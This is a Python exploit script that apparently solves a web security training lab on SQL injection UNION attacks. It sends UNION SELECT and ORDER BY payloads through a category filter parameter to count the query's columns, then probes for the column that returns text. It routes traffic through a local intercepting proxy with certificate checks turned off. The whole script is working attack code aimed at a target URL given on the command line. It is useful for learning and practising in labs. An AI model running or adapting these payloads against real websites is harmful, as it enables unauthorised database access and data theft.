# SQL injection UNION attack, finding a column containing text

import sys
import requests
import urllib3
import urllib.parse
import re
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def send_payload(s, url, payload):
	injection_uri = url + payload
	r = s.get(injection_uri)
	time.sleep(1)
	print('[+] Using payload:\t%s' % payload)
	return r

def search_string_field(s, url, columns_count, string_to_find):
	filter_path = url + '/filter?category='
	for i in range(1, columns_count + 1):
		string = "'%s'" % string_to_find
		payload_list = ["NULL"] * columns_count
		payload_list[i - 1] = string
		sql_payload = "' UNION SELECT " + ','.join(payload_list) + "--"
		r = s.get(filter_path + sql_payload)
		res = r.text
		if r.status_code == 200 and string_to_find in res:
			print('[+] Payload that Found "%s":' % string_to_find)
			print('\t%s' % (filter_path + sql_payload))
			return i
	return False

def exploit_sqli(s, url, payload):
	filter_path = url + '/filter?category='
	if payload == "SOLUTION1":
		print('[+] Using the UNION SELECT method to retrieve the number of columns !')
		payload = "' UNION SELECT NULL--"
		for i in range(1, 8):
			if send_payload(s, filter_path, payload).status_code == 200:
				print('\n[+] Number of Columns returned:\t%s' % i)
				return i
			else:
				payload = payload[:-2]
				payload += ", NULL--"
	elif payload == "SOLUTION2":
		print('[+] Using the ORDER BY method to retrieve the number of columns !')
		for i in range(1, 8):
			payload = "' ORDER BY %s--" % i
			if send_payload(s, filter_path, payload).status_code == 500:
				print('[+] Number of Columns returned:\t%s' % (i - 1))
				return i - 1
	else:
		r = send_payload(s, filter_path, payload)
		if re.search(f'<h1>(.*)</h1>', r.text):
			print('\n[+] Response:\n\t%s' % re.search(f'<h1>(.*)</h1>', r.text).group(1))
			sys.exit(0)
		return r

def show_usage():
	print('[+] Usage: %s <URL> <PAYLOAD>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com "\' UNION SELECT NULL, NULL"' % sys.argv[0])
	print('[+] Example: %s https://www.target.com SOLUTION1\t\t(solve the lab)' % sys.argv[0])
	print('[+] Example: %s https://www.target.com SOLUTION2\t\t(solve the lab)' % sys.argv[0])
	sys.exit(-1)


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: SQL injection UNION attack, finding a column containing text')
	try:
		url = sys.argv[1].strip()
		payload = sys.argv[2].strip()
	except IndexError:
		show_usage()
	if payload == "SOLUTION":
		show_usage()
	parsed_url = urllib.parse.urlparse(url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		print('[+] Determining the number of columns returned by the query...')
		time.sleep(1)
		columns_count = exploit_sqli(s, url, payload) 
		if columns_count:
			r = s.get(url)
			try:
				string_to_find = re.search("Make the database retrieve the string: '(.*)'", r.text).group(1)
			except:
				print('\n[-] NOT ABLE TO RETRIEVE THE STRING, LAB ALREADY SOLVED <!>')
				exit(-1)
			print('Determining which column contains text: "%s"' % string_to_find)
			string_col = search_string_field(s, url, columns_count, string_to_find)
			if string_col:
				print('\n[+] The column that contains text is: ' + str(string_col))
			else:
				print('\n[-] Exploit Failed to find the column with a string <!>')
		else:
			print('\n[-] SQL Injection Failed <!>')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
